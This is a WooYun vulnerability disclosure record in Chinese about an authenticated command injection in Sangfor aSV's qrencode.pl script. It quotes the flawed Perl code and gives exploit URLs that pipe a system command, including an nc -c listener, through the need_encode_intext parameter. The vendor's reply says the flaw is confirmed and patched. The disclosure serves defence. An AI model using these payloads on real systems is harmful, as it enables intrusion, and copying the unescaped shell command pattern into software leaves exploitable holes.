{"id": 73355, "wybug_id": "wooyun-2015-0145283", "wybug_title": "深信服aSV漏洞第一弹之Remote Code Execution", "wybug_corp": "深信服", "wybug_author": "路人甲", "wybug_date": "2015-10-08 11:20", "wybug_open_date": "2016-01-11 15:32", "wybug_type": "远程代码执行", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-12：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-12-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-11：\t细节向公众公开  简要描述： perl脚本有问题，有软waf也没用 详细说明：  利用此漏洞前提：需要登陆aSV控制台而且权限较低（www-data），所以自评漏洞为中问题代码出在qrencode.pl上，程序猿自己回去检查\n#!/usr/bin/perl -w#1、获取传入参数my $r = Apache2::RequestUtil->request();my $cgi = CGI->new($r);my $need_encode_intext = $cgi->param( 'need_encode_intext' );exit (0) if(!defined($need_encode_intext) || ($need_encode_intext eq \"\"));#2、根据传入参数得到二维码图片my $qrencode_png_name = 'tmp_qrencode.png';my $qrencode_png_path = \"/tmp/$qrencode_png_name\";my $errmsg=\"\";eval {\t#如果图片存在，那么就删除\tif(-f $qrencode_png_path) {\t\tunlink $qrencode_png_path or lerror(\"Failed unlink ${qrencode_png_path}, err: $!\");\t}\t#转换得到二维码图片\tmy $cmdstr = \"/usr/bin/qrencode  -o  ${qrencode_png_path} ${need_encode_intext}\";\tVTP::Tools::run_command($cmdstr,errfunc => sub { $errmsg = $errmsg . shift . \"\\n\"; });};\n你们懂的，问题出在my $cmdstr = \"/usr/bin/qrencode  -o  ${qrencode_png_path} ${need_encode_intext}\";登陆aSV后访问\n/qrencode.pl?need_encode_intext=123|系统命令\n即可执行系统命令，不过这里继承了apache的用户组www-data，所以权限较低那么要怎么样获得命令回显呢，利用NC的-c参数\n/qrencode.pl?need_encode_intext=123|nc -nnvl -p 5500 -c 'id'\n访问上面URL后telnet aSV的5500端口即可看到命令回显\n\n   漏洞证明：  \n\n   修复方案：  你们懂的   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：3  确认时间：2015-10-09 12:52 厂商回复： 感谢白帽子提交的问题。经确认，该漏洞确实存在，不过需要先登录控制台才能利用此漏洞，利用此漏洞不能读取到任何业务数据，且权限过低，也无法进行写入操作，并不能对业务数据造成影响，考虑以上因素，我们将此漏洞危害等级评为低。目前针对该漏洞的补丁包已经发布。感谢白帽子为我们指出问题，请白帽子私信留下联系方式，我们将为您寄送礼物以示答谢！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 3, "Ranks": null}